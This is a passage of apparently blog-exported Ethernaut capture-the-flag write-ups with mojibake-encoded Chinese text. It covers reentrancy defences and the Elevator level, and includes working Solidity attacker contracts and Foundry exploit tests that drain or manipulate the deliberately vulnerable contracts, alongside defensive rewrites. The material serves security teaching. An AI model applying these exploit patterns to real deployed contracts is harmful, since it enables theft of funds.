éªŒè¯æ”»å‡»è€…çš„ä½™é¢è®°å½•</span><br><span class=\"line\">        assertEq(reentrance.balanceOf(address(attacker)), 0); // æœ€ç»ˆä½™é¢ä¸º0</span><br><span class=\"line\">        assertEq(address(reentrance).balance, 0); // åˆçº¦è¢«æç©º</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œé‡å…¥æ”»å‡»æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract ReentranceTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¾“å‡ºåº”è¯¥æ˜¾ç¤ºåˆçº¦ä½™é¢è¢«å®Œå…¨æç©º</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-CEI-æ¨¡å¼-Check-Effects-Interactions\"><a href=\"#1-CEI-æ¨¡å¼-Check-Effects-Interactions\" class=\"headerlink\" title=\"1. CEI æ¨¡å¼ (Check-Effects-Interactions)\"></a>1. CEI æ¨¡å¼ (Check-Effects-Interactions)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureReentrance &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">        // âœ… æ£€æŸ¥ (Check)</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âœ… æ•ˆæœ (Effect) - å…ˆæ›´æ–°çŠ¶æ€</span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âœ… äº¤äº’ (Interaction) - æœ€åè¿›è¡Œå¤–éƒ¨è°ƒç”¨</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-é‡å…¥é”-Reentrancy-Guard\"><a href=\"#2-é‡å…¥é”-Reentrancy-Guard\" class=\"headerlink\" title=\"2. é‡å…¥é” (Reentrancy Guard)\"></a>2. é‡å…¥é” (Reentrancy Guard)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ReentrancyGuarded &#123;</span><br><span class=\"line\">    bool private locked;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier noReentrant() &#123;</span><br><span class=\"line\">        require(!locked, &quot;Reentrant call&quot;);</span><br><span class=\"line\">        locked = true;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        locked = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public noReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä½¿ç”¨-OpenZeppelin-çš„-ReentrancyGuard\"><a href=\"#3-ä½¿ç”¨-OpenZeppelin-çš„-ReentrancyGuard\" class=\"headerlink\" title=\"3. ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuard\"></a>3. ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuard</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract is ReentrancyGuard &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public nonReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-ä½¿ç”¨-transfer-è€Œé-call\"><a href=\"#4-ä½¿ç”¨-transfer-è€Œé-call\" class=\"headerlink\" title=\"4. ä½¿ç”¨ transfer() è€Œé call()\"></a>4. ä½¿ç”¨ transfer() è€Œé call()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âš ï¸ æœ‰é™é˜²æŠ¤ï¼ˆä¸æ¨èä½œä¸ºå”¯ä¸€é˜²æŠ¤æªæ–½ï¼‰</span><br><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _amount;</span><br><span class=\"line\">    payable(msg.sender).transfer(_amount); // é™åˆ¶ Gas ä¸º 2300</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-é‡å…¥æ”»å‡»ç±»å‹\"><a href=\"#1-é‡å…¥æ”»å‡»ç±»å‹\" class=\"headerlink\" title=\"1. é‡å…¥æ”»å‡»ç±»å‹\"></a>1. é‡å…¥æ”»å‡»ç±»å‹</h3><table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>æè¿°</th>\n<th>ç¤ºä¾‹</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>å•å‡½æ•°é‡å…¥</strong></td>\n<td>æ”»å‡»åŒä¸€ä¸ªå‡½æ•°</td>\n<td>æœ¬å…³å¡çš„ <code>withdraw()</code></td>\n</tr>\n<tr>\n<td><strong>è·¨å‡½æ•°é‡å…¥</strong></td>\n<td>æ”»å‡»ä¸åŒå‡½æ•°</td>\n<td><code>withdraw()</code> â†’ <code>transfer()</code></td>\n</tr>\n<tr>\n<td><strong>è·¨åˆçº¦é‡å…¥</strong></td>\n<td>æ”»å‡»ä¸åŒåˆçº¦</td>\n<td>DeFi åè®®é—´çš„å¤æ‚é‡å…¥</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-Gas-é™åˆ¶å¯¹æ¯”\"><a href=\"#2-Gas-é™åˆ¶å¯¹æ¯”\" class=\"headerlink\" title=\"2. Gas é™åˆ¶å¯¹æ¯”\"></a>2. Gas é™åˆ¶å¯¹æ¯”</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// transfer/send: 2300 gas (ä¸è¶³ä»¥è¿›è¡Œé‡å…¥)</span><br><span class=\"line\">payable(msg.sender).transfer(amount);</span><br><span class=\"line\"></span><br><span class=\"line\">// call: è½¬å‘æ‰€æœ‰å‰©ä½™ gas (å¯èƒ½å¯¼è‡´é‡å…¥)</span><br><span class=\"line\">(bool success,) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-çŠ¶æ€æ›´æ–°æ—¶åº\"><a href=\"#3-çŠ¶æ€æ›´æ–°æ—¶åº\" class=\"headerlink\" title=\"3. çŠ¶æ€æ›´æ–°æ—¶åº\"></a>3. çŠ¶æ€æ›´æ–°æ—¶åº</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ é”™è¯¯æ¨¡å¼</span><br><span class=\"line\">function vulnerable() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    externalCall();           // Interaction (å±é™©!)</span><br><span class=\"line\">    updateState();            // Effect (å¤ªæ™šäº†)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… æ­£ç¡®æ¨¡å¼</span><br><span class=\"line\">function secure() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    updateState();            // Effect (å…ˆæ›´æ–°çŠ¶æ€)</span><br><span class=\"line\">    externalCall();           // Interaction (å®‰å…¨)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å†å²æ¡ˆä¾‹\"><a href=\"#ğŸ›ï¸-å†å²æ¡ˆä¾‹\" class=\"headerlink\" title=\"ğŸ›ï¸ å†å²æ¡ˆä¾‹\"></a>ğŸ›ï¸ å†å²æ¡ˆä¾‹</h2><h3 id=\"The-DAO-æ”»å‡»-2016å¹´6æœˆ\"><a href=\"#The-DAO-æ”»å‡»-2016å¹´6æœˆ\" class=\"headerlink\" title=\"The DAO æ”»å‡» (2016å¹´6æœˆ)\"></a>The DAO æ”»å‡» (2016å¹´6æœˆ)</h3><ul>\n<li><strong>æŸå¤±</strong>: 360ä¸‡ ETH (å½“æ—¶ä»·å€¼çº¦6000ä¸‡ç¾å…ƒ)</li>\n<li><strong>åŸå› </strong>: splitDAO å‡½æ•°å­˜åœ¨é‡å…¥æ¼æ´</li>\n<li><strong>åæœ</strong>: ä»¥å¤ªåŠç¡¬åˆ†å‰ï¼Œäº§ç”Ÿ ETH å’Œ ETC</li>\n<li><strong>æ•™è®­</strong>: é‡å…¥æ”»å‡»çš„ç ´åæ€§å’Œé˜²æŠ¤é‡è¦æ€§</li>\n</ul>\n<h3 id=\"å…¶ä»–è‘—åæ¡ˆä¾‹\"><a href=\"#å…¶ä»–è‘—åæ¡ˆä¾‹\" class=\"headerlink\" title=\"å…¶ä»–è‘—åæ¡ˆä¾‹\"></a>å…¶ä»–è‘—åæ¡ˆä¾‹</h3><ol>\n<li><strong>Cream Finance</strong> (2021) - 1.3äº¿ç¾å…ƒæŸå¤±</li>\n<li><strong>bZx Protocol</strong> (2020) - å¤šæ¬¡é‡å…¥æ”»å‡»</li>\n<li><strong>Uniswap V1</strong> (æ—©æœŸç‰ˆæœ¬) - ç†è®ºæ¼æ´</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>é‡å…¥æ”»å‡»æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºçŸ³çŸ¥è¯†ï¼š</p>\n<ul>\n<li>âœ… <strong>ç†è§£ CEI æ¨¡å¼çš„é‡è¦æ€§</strong></li>\n<li>âœ… <strong>æŒæ¡å¤šç§é˜²æŠ¤æªæ–½çš„ä½¿ç”¨</strong></li>\n<li>âœ… <strong>è®¤è¯†çŠ¶æ€ç®¡ç†çš„å…³é”®æ€§</strong></li>\n<li>âœ… <strong>å­¦ä¹ å†å²æ¡ˆä¾‹çš„æ•™è®­</strong></li>\n</ul>\n<p>é‡å…¥æ”»å‡»çœ‹ä¼¼ç®€å•ï¼Œä½†å…¶å˜ç§å’Œç»„åˆå½¢å¼åœ¨ç°ä»£ DeFi åè®®ä¸­ä»ç„¶æ˜¯ä¸»è¦å¨èƒã€‚æŒæ¡å…¶åŸç†å’Œé˜²æŠ¤æªæ–½æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…çš„å¿…ä¿®è¯¾ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">ä¸Šä¸€å…³: Level 9 - King</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">ä¸‹ä¸€å…³: Level 11 - Elevator</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>å®‰å…¨çš„åˆçº¦ä¸ä»…è¦åšæ­£ç¡®çš„äº‹ï¼Œè¿˜è¦ä»¥æ­£ç¡®çš„é¡ºåºåšäº‹ã€‚</em> ğŸ”</p>\n"},{"title":"Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»","date":"2025-01-25T07:50:00.000Z","updated":"2025-01-25T07:50:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹ æ™ºèƒ½åˆçº¦æ¥å£å®ç°æ”»å‡»ï¼ŒæŒæ¡ Elevator å…³å¡çš„æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æªæ–½ã€‚ç†è§£æ¥å£å®šä¹‰ä¸å®ç°çš„å®‰å…¨é£é™©ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 11 - Elevator](https://ethernaut.openzeppelin.com/level/11)  \n> **æ”»å‡»ç±»å‹**: æ¥å£å®ç°æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nç›®çš„æ˜¯ä½¿ç”µæ¢¯è¾¾åˆ°æœ€é¡¶å±‚ï¼Œå³ä½¿é¢˜ç›®åˆçº¦çš„ `top` ä¸º `true`ã€‚å…³é”®åœ¨äºç†è§£æ¥å£å®šä¹‰ä¸å®é™…å®ç°çš„å·®åˆ«ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨è¿™ä¸ªå·®åˆ«è¿›è¡Œæ”»å‡»ã€‚\n\n![Elevator Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### æ¥å£çš„å®‰å…¨é£é™©\n\næœ¬å…³å¡é‡åœ¨è€ƒéªŒæˆ‘ä»¬å¯¹æ™ºèƒ½åˆçº¦æ¥å£çš„è®¤çŸ¥ç¨‹åº¦ï¼š\n- **æ¥å£å®šä¹‰å‡½æ•°ç­¾åï¼Œä½†ä¸å®šä¹‰å®ƒä»¬çš„é€»è¾‘**\n- è¿™æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹æ³•\n- ä½†ä¹Ÿæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ¥å£çš„å®ç°é€»è¾‘\n\n### å…³é”®æ¼æ´ä»£ç \n\n```solidity\nfunction goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (!building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼\n    }\n}\n```\n\n### æ”»å‡»å‘é‡\n\nåœ¨ `goTo` å‡½æ•°ä¸­ï¼Œ`isLastFloor` è¢«è°ƒç”¨ä¸¤æ¬¡ï¼š\n1. **ç¬¬ä¸€æ¬¡è°ƒç”¨**ï¼šå¿…é¡»è¿”å› `false`ï¼Œå¦åˆ™æ— æ³•è¿›å…¥ä¿®æ”¹ `top` çš„é€»è¾‘\n2. **ç¬¬äºŒæ¬¡è°ƒç”¨**ï¼šæˆ‘ä»¬å¯ä»¥è®©å®ƒè¿”å› `true` æ¥è®¾ç½® `top = true`\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª `isLastFloor()` æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå®ƒå°†ç¬¬ä¸€æ¬¡è¿”å› `false`ï¼Œç¬¬äºŒæ¬¡è¿”å› `true`ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/ElevatorFactory.sol\";\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\ncontract ElevatorAttacker is Building {\n    Elevator instance;\n    bool top = false;\n\n    constructor(address _elevator) {\n        instance = Elevator(_elevator);\n    }\n\n    // å…³é”®ï¼šçŠ¶æ€å˜åŒ–çš„æ¥å£å®ç°\n    function isLastFloor(uint _floor) external override returns (bool) {\n        top = !top;  // ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ top å˜ä¸º trueï¼Œç¬¬äºŒæ¬¡å˜ä¸º false\n        return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true\n    }\n\n    function attack(uint _floor) public {\n        instance.goTo(_floor);\n    }\n}\n\ncontract ElevatorTest is Test {\n    Ethernaut ethernaut;\n    ElevatorFactory elevatorFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        elevatorFactory = new ElevatorFactory();\n        ethernaut.registerLevel(elevatorFactory);\n    }\n    \n    function testElevatorExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);\n        Elevator instance = Elevator(levelInstance);\n        \n        // æ£€æŸ¥åˆå§‹çŠ¶æ€\n        assertEq(instance.top(), false);\n        assertEq(instance.floor(), 0);\n        \n        // éƒ¨ç½²æ”»å‡»åˆçº¦\n        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);\n        \n        // æ‰§è¡Œæ”»å‡»\n        attacker.attack(1);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.top(), true);\n        assertEq(instance.floor(), 1);\n        \n        // æäº¤å…³å¡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **å®ç° Building æ¥å£**ï¼šåˆ›å»ºä¸€ä¸ªåˆçº¦å®ç° `Building` æ¥å£\n2. **çŠ¶æ€å˜åŒ–é€»è¾‘**ï¼šåœ¨ `isLastFloor()` ä¸­å®ç°çŠ¶æ€å˜åŒ–\n3. **è°ƒç”¨ goTo å‡½æ•°**ï¼šé€šè¿‡æ”»å‡»åˆçº¦è°ƒç”¨ `goTo()`\n4. **éªŒè¯ç»“æœ**ï¼šæ£€æŸ¥ `top` æ˜¯å¦ä¸º `true`\n\n```solidity\n// çŠ¶æ€å˜åŒ–çš„å…³é”®å®ç°\nfunction isLastFloor(uint _floor) external override returns (bool) {\n    top = !top;  // åˆ‡æ¢çŠ¶æ€\n    return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šå¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\ncontract VulnerableElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {  // ç¬¬ä¸€æ¬¡è°ƒç”¨\n            floor = _floor;\n            top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼\n        }\n    }\n}\n\n// âœ… å®‰å…¨ï¼šåªè°ƒç”¨ä¸€æ¬¡å¹¶ç¼“å­˜ç»“æœ\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        bool isLast = building.isLastFloor(_floor);  // åªè°ƒç”¨ä¸€æ¬¡\n        \n        if (!isLast) {\n            floor = _floor;\n            top = isLast;  // ä½¿ç”¨ç¼“å­˜çš„ç»“æœ\n        }\n    }\n}\n```\n\n### 2. ä½¿ç”¨ view å‡½æ•°\n\n```solidity\n// âœ… ä½¿ç”¨ view å‡½æ•°é˜²æ­¢çŠ¶æ€æ”¹å˜\ninterface Building {\n    function isLastFloor(uint) external view returns (bool);  // view ä¿®é¥°ç¬¦\n}\n\ncontract SecureElevator {\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n        \n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);  // view å‡½æ•°ä¿è¯ä¸€è‡´æ€§\n        }\n    }\n}\n```\n\n### 3. ä½¿ç”¨ç™½åå•æœºåˆ¶\n\n```solidity\ncontract SecureElevator {\n    mapping(address => bool) public approvedBuildings;\n    address public owner;\n    \n    modifier onlyApprovedBuilding() {\n        require(approvedBuildings[msg.sender], \"Unauthorized building\");\n        _;\n    }\n    \n    function addApprovedBuilding(address building) public {\n        require(msg.sender == owner);\n        approvedBuildings[building] = true;\n    }\n    \n    function goTo(uint _floor) public onlyApprovedBuilding {\n        // å®‰å…¨é€»è¾‘\n    }\n}\n```\n\n### 4. å®ç°å†…éƒ¨é€»è¾‘\n\n```solidity\ncontract SecureElevator {\n    uint public floor;\n    bool public top;\n    uint public topFloor = 10;  // å®šä¹‰æœ€é«˜å±‚\n    \n    function goTo(uint _floor) public {\n        require(_floor <= topFloor, \"Floor too high\");\n        \n        floor = _floor;\n        top = (_floor == topFloor);  // å†…éƒ¨åˆ¤æ–­é€»è¾‘\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### æ¥å£å®‰å…¨æ£€æµ‹\n\n```solidity\n// æ£€æµ‹æ¥å£å®ç°çš„ä¸€è‡´æ€§\ncontract InterfaceChecker {\n    function checkConsistency(address building, uint floor) public {\n        Building b = Building(building);\n        \n        // å¤šæ¬¡è°ƒç”¨æ£€æŸ¥ä¸€è‡´æ€§\n        bool result1 = b.isLastFloor(floor);\n        bool result2 = b.isLastFloor(floor);\n        \n        require(result1 == result2, \"Inconsistent interface implementation\");\n    }\n}\n```\n\n### åˆçº¦åˆ†æå·¥å…·\n\n```bash\n# ä½¿ç”¨ Slither æ£€æµ‹æ¥å£å®‰å…¨é—®é¢˜\nslither . --detect external-function\n\n# ä½¿ç”¨ Mythril åˆ†æ\nMyth analyze <contract.sol> --execution-timeout 60\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- æ¥å£æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹å¼\n- ä½†æ°¸è¿œä¸è¦ç›²ç›®ç›¸ä¿¡å®ƒä»¬ï¼\n- å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°å¯èƒ½äº§ç”Ÿä¸ä¸€è‡´çš„ç»“æœ\n\n**æ”»å‡»å‘é‡**:\n- å®ç°æ¶æ„çš„æ¥å£é€»è¾‘\n- åˆ©ç”¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´çš„çŠ¶æ€å˜åŒ–\n- æ“çºµå‡½æ•°è¿”å›å€¼ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„\n\n**é˜²å¾¡ç­–ç•¥**:\n- åªè°ƒç”¨ä¸€æ¬¡å¤–éƒ¨å‡½æ•°å¹¶ç¼“å­˜ç»“æœ\n- ä½¿ç”¨ `view` å‡½æ•°ä¿®é¥°ç¬¦é˜²æ­¢çŠ¶æ€æ”¹å˜\n- å®ç°ç™½åå•æœºåˆ¶æ§åˆ¶è®¿é—®\n- å°½å¯èƒ½ä½¿ç”¨å†…éƒ¨é€»è¾‘è€Œä¸ä¾èµ–å¤–éƒ¨å®ç°\n\n","source":"_posts/ethernaut-level-11-elevator.md","raw":"---\ntitle: 'Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»'\ndate: 2025-01-25 15:50:00\nupdated: 2025-01-25 15:50:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - æ¥å£å®ç°æ”»å‡»\n  - æ™ºèƒ½åˆçº¦æ¥å£\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - çŠ¶æ€æ“çºµ\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹ æ™ºèƒ½åˆçº¦æ¥å£å®ç°æ”»å‡»ï¼ŒæŒæ¡ Elevator å…³å¡çš„æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æªæ–½ã€‚ç†è§£æ¥å£å®šä¹‰ä¸å®ç°çš„å®‰å…¨é£é™©ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 11 - Elevator](https://ethernaut.openzeppelin.com/level/11)  \n> **æ”»å‡»ç±»å‹**: æ¥å£å®ç°æ”»å‡»  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nç›®çš„æ˜¯ä½¿ç”µæ¢¯è¾¾åˆ°æœ€é¡¶å±‚ï¼Œå³ä½¿é¢˜ç›®åˆçº¦çš„ `top` ä¸º `true`ã€‚å…³é”®åœ¨äºç†è§£æ¥å£å®šä¹‰ä¸å®é™…å®ç°çš„å·®åˆ«ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨è¿™ä¸ªå·®åˆ«è¿›è¡Œæ”»å‡»ã€‚\n\n![Elevator Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### 